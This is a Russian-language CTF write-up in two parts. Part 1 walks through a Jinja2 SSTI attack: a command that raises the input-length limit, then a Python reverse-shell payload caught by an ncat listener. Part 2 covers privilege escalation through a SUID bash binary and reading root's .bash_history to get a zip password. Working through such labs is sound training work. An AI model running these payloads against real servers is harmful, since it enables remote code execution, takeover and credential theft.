
# Подробный план решения задачи SSTI для получения реверс-шелла. Часть 1

### План:

1. Поднимаем локальный слушающий сервер с помощью `ncat` для получения реверс-шелла.
2. Обходим ограничение на длину пейлоада на веб-странице.
3. Вводим команду для получения реверс-шелла через SSTI.
4. Подключаемся к реверс-шеллу.

### Шаги:

### Шаг 1) Настройка локального слушающего сервера

Сначала нужно подготовить локальную машину для приема реверс-шелла. Для этого используем `ncat` (или аналогичную утилиту), чтобы открыть порт для прослушивания входящих соединений.

Используйте следующую команду:

```bash
ncat -lvnp 9001
```

Пояснение:
- `-l`: указывает `ncat` прослушивать (listen) входящие соединения.
- `-v`: включает режим подробного вывода (verbose), чтобы видеть информацию о соединениях.
- `-n`: указывает `ncat` не выполнять DNS-обратный запрос.
- `-p 9001`: задает порт 9001 для прослушивания.

После выполнения команды ваша машина будет готова к приему реверс-шелла.

---

### Шаг 2) Обход ограничения на длину пейлоада

На сайте может существовать ограничение по длине вводимого текста в форму, которое мешает выполнить полный реверс-шелл пейлоад. Чтобы увеличить допустимую длину ввода, можно использовать уязвимость SSTI для выполнения системной команды на сервере. Вводим в форму следующий пейлоад:

```jinja
{{cycler.__init__.__globals__.os.popen('echo "999" >name_limit.txt').read()}}
```

Что делает этот пейлоад:
- `cycler.__init__.__globals__`: доступ к глобальному пространству имен через объект `cycler`.
- `os.popen(...)`: выполняет системную команду на сервере.
- `'echo "999" > name_limit.txt'`: команда создаёт (или перезаписывает) файл `name_limit.txt` с содержимым "999", что будет использоваться сервером для увеличения допустимой длины ввода пейлоада до 999 символов.

После выполнения этого пейлоада, максимальная длина ввода увеличится, что позволит вводить более длинные команды.

---

### Шаг 3) Ввод пейлоада для реверс-шелла

Теперь, когда лимит длины пейлоада увеличен, можно ввести полноценную команду для получения реверс-шелла через SSTI.

Используем следующий пейлоад:

```jinja
{{cycler.__init__.__globals__.os.popen("python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("<ip-адрес>",9001));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'").read()}}
```

**Описание пейлоада**:
- Этот пейлоад использует уязвимость SSTI для выполнения Python-скрипта на сервере.
- Python-скрипт создает TCP-сокет, который подключается к вашему IP-адресу на порт 9001 (замените `<ip-адрес>` на ваш реальный IP-адрес).
- Функция `os.dup2` перенаправляет потоки ввода/вывода/ошибок (stdin, stdout, stderr) через сокет, а `pty.spawn("sh")` запускает интерактивную оболочку `sh`.

---

### Шаг 4) Получение реверс-шелла

Как только пейлоад будет отправлен, сервер выполнит команду и подключится к вашему локальному `ncat` на порт 9001. На этом этапе вы получите реверс-шелл с доступом к системе, на которой запущен уязвимый сервер.

Теперь можно взаимодействовать с удаленной системой через командную оболочку.

---

### Заключение. Часть 1

Таким образом, последовательное выполнение шагов позволяет обойти ограничение длины пейлоада и получить реверс-шелл с помощью уязвимости SSTI. Это предоставляет полный доступ к системе для дальнейшего исследования и эксплуатации.



# Writeup: Linux Administration CTF. Часть 2

## План:

1. Обнаруживаем файл `flag.zip`, но не можем его распаковать из-за недостатка привилегий.
2. Используем SUID-уязвимость для повышения привилегий до root.
3. Пытаемся разархивировать файл от имени root, но для этого требуется пароль.
4. Находим пароль в файле `.bash_history` пользователя root.
5. Используем пароль для распаковки архива и получения флага.

---

## Шаг 1) Обнаружение архива `flag.zip`

После подключения к системе с реверсшеллом, находим файл `flag.zip` в домашней директории пользователя `user1`. Проверяем содержимое директории:

```bash
ls /home/user1/ctf
```

Вывод:

```
flag.zip
```

Пытаемся разархивировать файл:

```bash
unzip flag.zip
```

Однако получаем ошибку доступа:

```
unzip: cannot find or open flag.zip, flag.zip.zip or flag.zip.ZIP.
```

Причина в недостаточных привилегиях для пользователя. Нужно искать способ повысить права до root.

---

## Шаг 2) Повышение привилегий до root через SUID

Находим SUID-бинарный файл, который позволяет повысить привилегии до root. Проверяем наличие SUID-бинарников:

```bash
find / -perm -4000 2>/dev/null
```

В списке видим бинарный файл `/usr/local/bin/suidbash`, на который установлен SUID-бит:

```
/usr/local/bin/suidbash
```

Запускаем этот файл, чтобы стать root:

```bash
/usr/local/bin/suidbash
```

Теперь у нас привилегии root. Проверяем текущего пользователя:

```bash
whoami
```

Вывод:

```
root
```

---

## Шаг 3) Попытка разархивировать архив от имени root

Теперь, будучи root, пробуем разархивировать файл `flag.zip`:

```bash
unzip /home/user1/ctf/flag.zip
```

Однако теперь получаем запрос на пароль для распаковки:

```
Archive:  flag.zip
[flag.zip] flag.txt password:
```

Нужно найти пароль для архива.

---

## Шаг 4) Поиск пароля в `bash_history`

Чтобы найти пароль, проверим историю команд пользователя root. Открываем файл `.bash_history`:

```bash
cat /root/.bash_history
```

В выводе видим строку:

```
unzip -P supersecret flag.zip
```

Это и есть пароль для архива — `supersecret`.

---

## Шаг 5) Распаковка архива и получение флага

Используем найденный пароль для распаковки архива:

```bash
unzip -P supersecret /home/user1/ctf/flag.zip
```

Теперь архив успешно распакован. Проверяем содержимое директории:

```bash
ls /home/user1/ctf
```

Вывод:

```
flag.txt  flag.zip
```

Читаем флаг:

```bash
cat /home/user1/ctf/flag.txt
```

Флаг:

```
FLAG{congrats_you_got_it}
```

---

## Заключение

В этой задаче мы прошли несколько шагов, начиная с ограничения прав доступа к архиву, повышения привилегий до root через SUID, поиска пароля в истории команд и, наконец, успешной распаковки архива с флагом. 
